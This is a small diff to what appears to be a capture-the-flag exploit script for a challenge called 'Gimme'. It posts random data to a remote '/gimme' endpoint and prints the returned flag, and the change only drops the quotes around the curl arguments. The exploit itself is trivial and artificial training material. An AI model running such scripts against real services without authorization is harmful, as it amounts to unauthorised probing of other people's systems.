@@ -15,6 +15,6 @@ fi
 echo "Start exploit for Gimme"
 remote=$remote'/gimme'
 data=$(tr -dc A-Za-z0-9 < /dev/urandom | head -c 35)
-flag=$(curl -s -X POST -H "Content-Type: text/plain" --data "$data" "$remote")
+flag=$(curl -s -X POST -H "Content-Type: text/plain" --data $data $remote)
 echo "Flag is $flag"
 echo "-------------------------"
